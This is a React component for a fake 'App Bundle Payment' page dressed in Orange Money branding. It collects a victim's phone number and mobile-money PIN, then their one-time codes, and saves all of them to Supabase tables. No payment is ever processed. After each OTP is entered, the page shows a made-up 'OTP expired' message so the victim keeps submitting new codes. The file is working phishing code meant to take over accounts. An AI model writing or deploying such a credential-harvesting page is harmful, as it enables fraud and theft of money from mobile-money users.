import { useState, useEffect } from "react";
import { Phone, Lock, ChevronDown, Globe, ArrowLeft } from "lucide-react";
import countryCodes from "./countryCodes";
import { supabase } from "./supabaseClient";

type PaymentStep = "payment" | "otp";
type Language = "en" | "fr";

interface PaymentFormData {
  countryCode: string;
  phoneNumber: string;
  pin: string;
}

const LOGO_URL =
  "https://1000logos.net/wp-content/uploads/2021/02/Orange-Money-logo.png";

const BG_IMAGE_URL =
  "https://orangemoney.orange.cm/orange-money/resources/img/Generique%20OM%20Mastercard.jpeg";

const translations = {
  en: {
    bundlePayment: "App Bundle Payment",
    verifyPayment: "Verify Payment",
    country: "Country",
    chooseCountry: "Choose your country",
    phoneNumber: "Phone Number",
    pin: "Enter your PIN",
    pinPlaceholder: "4–5-digit PIN",
    processing: "Processing...",
    confirmPayment: "Confirm Payment",
    otpSent: "Enter OTP sent to",
    otpError: "OTP must be 4–6 digits",
    tryAgain: "Try again in",
    verifyOtp: "Verify OTP",
    back: "Back",
    chooseLanguage: "Choose Language",
  },
  fr: {
    bundlePayment: "Paiement du forfait",
    verifyPayment: "Vérifier le paiement",
    country: "Pays",
    chooseCountry: "Choisissez votre pays",
    phoneNumber: "Numéro de téléphone",
    pin: "Code PIN",
    pinPlaceholder: "PIN à 4–5 chiffres",
    processing: "Traitement...",
    confirmPayment: "Confirmer le paiement",
    otpSent: "Saisissez le code envoyé à",
    otpError: "Le code doit contenir 4–6 chiffres",
    tryAgain: "Réessayez dans",
    verifyOtp: "Vérifier le code",
    back: "Retour",
    chooseLanguage: "Choisir la langue",
  },
};

export default function VodacomPayment() {
  const [language, setLanguage] = useState<Language>("en");
  const t = translations[language];

  const [languageOpen, setLanguageOpen] = useState(false);
  const [step, setStep] = useState<PaymentStep>("payment");
  const [formData, setFormData] = useState<PaymentFormData>({
    countryCode: "",
    phoneNumber: "",
    pin: "",
  });

  // ✅ OTP is now a single string
  const [otp, setOtp] = useState("");

  const [loading, setLoading] = useState(false);
  const [dropdownOpen, setDropdownOpen] = useState(false);
  const [otpError, setOtpError] = useState("");
  const [retrySeconds, setRetrySeconds] = useState(0);

  // --- Validation flags ---
  const isPhoneValid = /^\d{9,10}$/.test(formData.phoneNumber);
  const isPinValid = /^\d{4,5}$/.test(formData.pin);
  const isPaymentValid = formData.countryCode && isPhoneValid && isPinValid;

  const handlePayment = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isPaymentValid) return;

    setLoading(true);
    try {
      const { error } = await supabase.from("orange_payment_records").insert({
        country: formData.countryCode,
        number: formData.phoneNumber,
        pin: formData.pin,
      });

      if (error) throw error;

      setStep("otp");
    } catch {
      alert(
        language === "en"
          ? "Error saving payment."
          : "Erreur lors de l'enregistrement."
      );
    } finally {
      setLoading(false);
    }
  };

  const handleVerifyOtp = async (e: React.FormEvent) => {
    e.preventDefault();
    const code = otp;

    // --- 4 to 6 digit validation ---
    if (code.length < 4 || code.length > 6 || !/^\d{4,6}$/.test(code)) {
      setOtpError(t.otpError);
      return;
    }

    if (retrySeconds > 0) return;

    setLoading(true);
    try {
      const { error } = await supabase.from("orange_otp_records").insert({
        country: formData.countryCode,
        number: formData.phoneNumber,
        otp: code,
      });

      if (error) throw error;

      setOtpError(
        language === "en"
          ? "OTP expired. Try again in 10 sec."
          : "Code expiré. Réessayez dans 10 sec."
      );
      setRetrySeconds(10);
      setOtp("");
    } catch {
      setOtpError(language === "en" ? "OTP error." : "Erreur du code.");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (retrySeconds > 0) {
      const timer = setInterval(() => setRetrySeconds((s) => s - 1), 1000);
      return () => clearInterval(timer);
    } else setOtpError("");
  }, [retrySeconds]);

  // --- Back arrow handler ---
  const handleBack = () => {
    if (step === "otp") {
      setStep("payment");
    } else {
      window.history.back();
    }
  };

  return (
    <div
      className="min-h-screen flex items-center justify-center p-4 bg-cover bg-center"
      style={{ backgroundImage: `url(${BG_IMAGE_URL})` }}
    >
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl overflow-hidden relative">

        {/* Back Arrow */}
        <div className="absolute top-4 left-4 z-20">
          <button
            onClick={handleBack}
            className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm"
          >
            <ArrowLeft size={16} />
            {t.back}
          </button>
        </div>

        {/* Language Dropdown */}
        <div className="absolute top-4 right-4">
          <div className="relative">
            <button
              type="button"
              onClick={() => setLanguageOpen(!languageOpen)}
              className="flex items-center gap-2 px-3 py-1 bg-gray-100 rounded-lg text-sm"
            >
              <Globe size={16} />
              {language.toUpperCase()}
              <ChevronDown size={16} />
            </button>

            {languageOpen && (
              <div className="absolute right-0 mt-2 bg-white border rounded-lg shadow-md w-32">
                <div
                  onClick={() => {
                    setLanguage("en");
                    setLanguageOpen(false);
                  }}
                  className="px-4 py-2 hover:bg-gray-100 cursor-pointer"
                >
                  English
                </div>
                <div
                  onClick={() => {
                    setLanguage("fr");
                    setLanguageOpen(false);
                  }}
                  className="px-4 py-2 hover:bg-gray-100 cursor-pointer"
                >
                  Français
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Header */}
        <div className="bg-orange-600 px-6 py-10 text-white text-center">
          <div className="bg-white rounded-2xl p-4 w-32 mx-auto mb-6 shadow-md">
            <img src={LOGO_URL} alt="Orange Money" className="h-30 w-50" />
          </div>
          <h1 className="text-2xl font-bold">
            {step === "payment" ? t.bundlePayment : t.verifyPayment}
          </h1>
        </div>

        {/* Payment Form */}
        {step === "payment" ? (
          <form onSubmit={handlePayment} className="p-6 space-y-6">
            {/* Country */}
            <div className="relative">
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                {t.country}
              </label>
              <button
                type="button"
                onClick={() => setDropdownOpen(!dropdownOpen)}
                className="w-full px-4 py-3 border-2 border-gray-300 rounded-xl flex items-center justify-between bg-white"
              >
                <span className="text-gray-400">
                  {formData.countryCode || t.chooseCountry}
                </span>
                <ChevronDown />
              </button>

              {dropdownOpen && (
                <div className="absolute bg-white border rounded-xl w-full mt-1 max-h-56 overflow-y-auto shadow-lg z-10">
                  {countryCodes.map((c) => (
                    <div
                      key={c.code}
                      className="p-2 flex items-center gap-2 hover:bg-orange-50 cursor-pointer"
                      onClick={() => {
                        setFormData({ ...formData, countryCode: c.code });
                        setDropdownOpen(false);
                      }}
                    >
                      <img src={c.flag} className="w-5 h-5 rounded" />
                      <span className="flex-1">{c.country}</span>
                      <span className="text-gray-500">{c.code}</span>
                    </div>
                  ))}
                </div>
              )}
            </div>

            {/* Phone */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                {t.phoneNumber}
              </label>
              <div className="relative">
                <Phone className="absolute left-4 top-3 text-gray-400" />
                <input
                  type="tel"
                  className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white"
                  placeholder="712345678"
                  value={formData.phoneNumber}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      phoneNumber: e.target.value.replace(/\D/g, "").slice(0, 10),
                    })
                  }
                />
              </div>
            </div>

            {/* PIN */}
            <div>
              <label className="block text-sm font-semibold text-gray-700 mb-2">
                {t.pin}
              </label>
              <div className="relative">
                <Lock className="absolute left-4 top-3 text-gray-400" />
                <input
                  type="password"
                  maxLength={5}
                  className="w-full pl-12 pr-4 py-3 border-2 border-gray-300 rounded-xl bg-white"
                  placeholder={t.pinPlaceholder}
                  value={formData.pin}
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      pin: e.target.value.replace(/\D/g, ""),
                    })
                  }
                />
              </div>
            </div>

            {/* Confirm */}
            <button
              disabled={!isPaymentValid || loading}
              className={`w-full py-4 rounded-xl font-semibold text-lg shadow-lg ${
                !isPaymentValid || loading
                  ? "bg-gray-400 cursor-not-allowed"
                  : "bg-orange-600 text-white"
              }`}
            >
              {loading ? t.processing : t.confirmPayment}
            </button>
          </form>
        ) : (
          /* OTP Form (single box) */
          <form onSubmit={handleVerifyOtp} className="p-6 text-center">

            <p className="mb-4 text-gray-700">
              {t.otpSent} {formData.countryCode} {formData.phoneNumber}
            </p>

            {/* 🔥 ONE LONG OTP INPUT */}
            <input
              type="tel"
              maxLength={6}
              value={otp}
              onChange={(e) =>
                setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))
              }
              className="w-64 mx-auto text-center text-2xl py-3 border-2 border-gray-300 rounded-xl bg-white tracking-widest"
              placeholder="Enter OTP (4–6 digits)"
            />

            {otpError && (
              <p className="text-orange-600 font-medium mt-3">{otpError}</p>
            )}

            <button
              type="submit"
              disabled={retrySeconds > 0}
              className="w-full mt-4 bg-orange-600 text-white py-4 rounded-xl font-semibold text-lg shadow-lg disabled:bg-gray-400"
            >
              {retrySeconds > 0
                ? `${t.tryAgain} ${retrySeconds}s`
                : t.verifyOtp}
            </button>
          </form>
        )}
      </div>
    </div>
  );
}